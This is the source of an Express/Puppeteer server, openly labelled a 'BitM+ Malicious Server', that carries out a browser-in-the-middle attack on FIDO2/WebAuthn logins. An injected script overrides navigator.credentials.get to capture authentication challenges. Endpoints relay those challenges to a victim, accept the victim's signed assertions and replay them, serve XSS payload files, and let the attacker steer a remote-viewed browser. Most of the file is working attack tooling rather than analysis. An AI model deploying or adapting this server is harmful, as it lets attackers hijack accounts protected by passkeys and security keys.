const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const morgan = require('morgan');
const puppeteer = require('puppeteer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(morgan('dev'));

// État global
let browser = null;
let page = null;
let isInitialized = false;

// Logs directory
const LOG_DIR = path.join(__dirname, '../../logs');
if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR, { recursive: true });
}

// Logger personnalisé
function log(level, message, data = null) {
    const timestamp = new Date().toISOString();
    const logEntry = {
        timestamp,
        level,
        message,
        data
    };
    
    console.log(`[${timestamp}] [${level}] ${message}`, data || '');
    
    const logFile = path.join(LOG_DIR, `malserver-${new Date().toISOString().split('T')[0]}.log`);
    fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
}

// ==================== INITIALISATION PUPPETEER ====================

async function initializeBrowser() {
    if (isInitialized) {
        log('INFO', 'Browser already initialized');
        return;
    }

    try {
        log('INFO', 'Launching Puppeteer browser...');
        
        browser = await puppeteer.launch({
            headless: false, // Mode visible pour noVNC
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--window-size=1920,1080'
            ],
            defaultViewport: {
                width: 1920,
                height: 1080
            }
        });

        page = await browser.newPage();
        
        // Injecter override AVANT navigation
        await page.evaluateOnNewDocument(() => {
            // Code bitm_overrider_pup.js sera injecté ici
            console.log('[BitM+] Override script injected');
            
            const originalGet = navigator.credentials.get;
            
            navigator.credentials.get = function evilGet(options) {
                console.log('[BitM+ evilGet] Intercepted credentials.get()');
                console.log('[BitM+ evilGet] Options:', options);
                
                let chObj = options.publicKey;
                
                // Stocker challenge
                localStorage.setItem('mychallenge', JSON.stringify(chObj));
                console.log('[BitM+ evilGet] Challenge stored in localStorage');
                
                // Retourner Promise en attente d'assertion
                return new Promise((resolve, reject) => {
                    console.log('[BitM+ evilGet] Waiting for assertion from victim...');
                    
                    let pollCount = 0;
                    let interval = setInterval(() => {
                        pollCount++;
                        
                        let assertObj = localStorage.getItem('mysolution');
                        
                        if (assertObj !== null && assertObj !== 'null') {
                            console.log('[BitM+ evilGet] Assertion received!');
                            clearInterval(interval);
                            
                            // Nettoyer
                            localStorage.setItem('mysolution', null);
                            localStorage.setItem('mychallenge', null);
                            
                            try {
                                const assertion = deserializeAssertion(JSON.parse(assertObj));
                                console.log('[BitM+ evilGet] Assertion deserialized, resolving...');
                                resolve(assertion);
                            } catch (err) {
                                console.error('[BitM+ evilGet] Deserialization error:', err);
                                reject(err);
                            }
                        }
                        
                        // Log périodique
                        if (pollCount % 50 === 0) {
                            console.log(`[BitM+ evilGet] Still waiting... (${pollCount * 100}ms)`);
                        }
                    }, 100);
                    
                    // Timeout 60s
                    setTimeout(() => {
                        clearInterval(interval);
                        console.error('[BitM+ evilGet] Timeout after 60s');
                        reject(new DOMException('The operation timed out', 'NotAllowedError'));
                    }, 60000);
                });
            };
            
            // Fonction désérialisation
            function deserializeAssertion(obj) {
                return {
                    id: obj.id,
                    rawId: base64ToArrayBuffer(obj.rawId),
                    response: {
                        authenticatorData: base64ToArrayBuffer(obj.response.authenticatorData),
                        clientDataJSON: base64ToArrayBuffer(obj.response.clientDataJSON),
                        signature: base64ToArrayBuffer(obj.response.signature),
                        userHandle: obj.response.userHandle ? 
                            base64ToArrayBuffer(obj.response.userHandle) : null
                    },
                    type: obj.type
                };
            }
            
            function base64ToArrayBuffer(base64) {
                const binary = atob(base64);
                const bytes = new Uint8Array(binary.length);
                for (let i = 0; i < binary.length; i++) {
                    bytes[i] = binary.charCodeAt(i);
                }
                return bytes.buffer;
            }
            
            console.log('[BitM+] navigator.credentials.get() successfully overridden');
        });
        
        log('INFO', 'Browser initialized successfully');
        isInitialized = true;
        
    } catch (error) {
        log('ERROR', 'Failed to initialize browser', error.message);
        throw error;
    }
}

// ==================== API ENDPOINTS ====================

// Health check
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        initialized: isInitialized,
        timestamp: new Date().toISOString()
    });
});

// GET /getChallenge - Publier challenge pour victime
app.get('/getChallenge', async (req, res) => {
    try {
        if (!page) {
            return res.status(503).json({ error: 'Browser not initialized' });
        }
        
        log('INFO', 'GET /getChallenge - Victim polling for challenge');
        
        const chObj = await page.evaluate(() => {
            return localStorage.getItem('mychallenge');
        });
        
        if (chObj && chObj !== 'null') {
            log('INFO', 'Challenge found, sending to victim');
            res.json(JSON.parse(chObj));
        } else {
            log('DEBUG', 'No challenge available yet');
            res.status(204).send(); // No content
        }
        
    } catch (error) {
        log('ERROR', 'Error in /getChallenge', error.message);
        res.status(500).json({ error: error.message });
    }
});

// POST /postResult - Recevoir assertion depuis victime
app.post('/postResult', async (req, res) => {
    try {
        if (!page) {
            return res.status(503).json({ error: 'Browser not initialized' });
        }
        
        const assertion = req.body;
        log('INFO', 'POST /postResult - Received assertion from victim');
        log('DEBUG', 'Assertion data', assertion);
        
        await page.evaluate((assertionJSON) => {
            localStorage.setItem('mysolution', assertionJSON);
            console.log('[MalSrv] Assertion stored in localStorage');
        }, JSON.stringify(assertion));
        
        log('INFO', 'Assertion stored successfully');
        res.status(200).json({ status: 'ok' });
        
    } catch (error) {
        log('ERROR', 'Error in /postResult', error.message);
        res.status(500).json({ error: error.message });
    }
});

// POST /postScreenSize - Synchroniser taille écran
app.post('/postScreenSize', async (req, res) => {
    try {
        if (!page) {
            return res.status(503).json({ error: 'Browser not initialized' });
        }
        
        const { width, height } = req.body;
        log('INFO', `POST /postScreenSize - Resizing to ${width}x${height}`);
        
        await page.setViewport({ width, height });
        
        log('INFO', 'Viewport resized successfully');
        res.status(200).json({ status: 'ok' });
        
    } catch (error) {
        log('ERROR', 'Error in /postScreenSize', error.message);
        res.status(500).json({ error: error.message });
    }
});

// GET /xss/payload.js - Servir payload JavaScript
app.get('/xss/payload.js', (req, res) => {
    log('INFO', 'GET /xss/payload.js - Serving XSS payload');
    
    // Déterminer quel payload envoyer
    const payloadType = req.query.type || 'novnc'; // 'novnc' ou 'fido2'
    
    let payloadPath;
    if (payloadType === 'novnc') {
        payloadPath = path.join(__dirname, '../../frontend/payload/payload-novnc.js');
    } else {
        payloadPath = path.join(__dirname, '../../frontend/payload/payload.js');
    }
    
    if (fs.existsSync(payloadPath)) {
        res.type('application/javascript');
        res.sendFile(payloadPath);
    } else {
        log('ERROR', 'Payload file not found', payloadPath);
        res.status(404).send('// Payload not found');
    }
});

// POST /navigate - Contrôler navigation BitM
app.post('/navigate', async (req, res) => {
    try {
        if (!page) {
            return res.status(503).json({ error: 'Browser not initialized' });
        }
        
        const { url } = req.body;
        log('INFO', `POST /navigate - Navigating to ${url}`);
        
        await page.goto(url, { waitUntil: 'networkidle2' });
        
        log('INFO', 'Navigation successful');
        res.status(200).json({ status: 'ok', url });
        
    } catch (error) {
        log('ERROR', 'Error in /navigate', error.message);
        res.status(500).json({ error: error.message });
    }
});

// Servir noVNC statique
const express_static = require('express');
app.use('/novnc', express_static(path.join(__dirname, '../../noVNC')));

// Route pour vnc_lite.html (version embedable)
app.get('/vnc_lite.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../../noVNC/vnc_lite.html'));
});


// ==================== DÉMARRAGE ====================

async function startServer() {
    try {
        // Initialiser browser
        await initializeBrowser();
        
        // Démarrer serveur Express
        app.listen(PORT, '0.0.0.0', () => {
            log('INFO', `MalSrv listening on port ${PORT}`);
            console.log(`
╔════════════════════════════════════════════════════════════╗
║             BitM+ Malicious Server v1.0                    ║
║════════════════════════════════════════════════════════════║
║  Server:     http://localhost:${PORT}                         ║
║  Health:     http://localhost:${PORT}/health                  ║
║  Logs:       ${LOG_DIR}                     ║
║════════════════════════════════════════════════════════════║
║  Endpoints:                                                ║
║    GET  /getChallenge   - Publish FIDO2 challenge          ║
║    POST /postResult     - Receive assertion from victim    ║
║    POST /postScreenSize - Sync screen dimensions           ║
║    GET  /xss/payload.js - Serve XSS payload                ║
║    POST /navigate       - Control BitM browser             ║
╚════════════════════════════════════════════════════════════╝
            `);
        });
        
    } catch (error) {
        log('FATAL', 'Failed to start server', error.message);
        process.exit(1);
    }
}

// Graceful shutdown
process.on('SIGINT', async () => {
    log('INFO', 'Shutting down gracefully...');
    if (browser) {
        await browser.close();
    }
    process.exit(0);
});

// Start
startServer();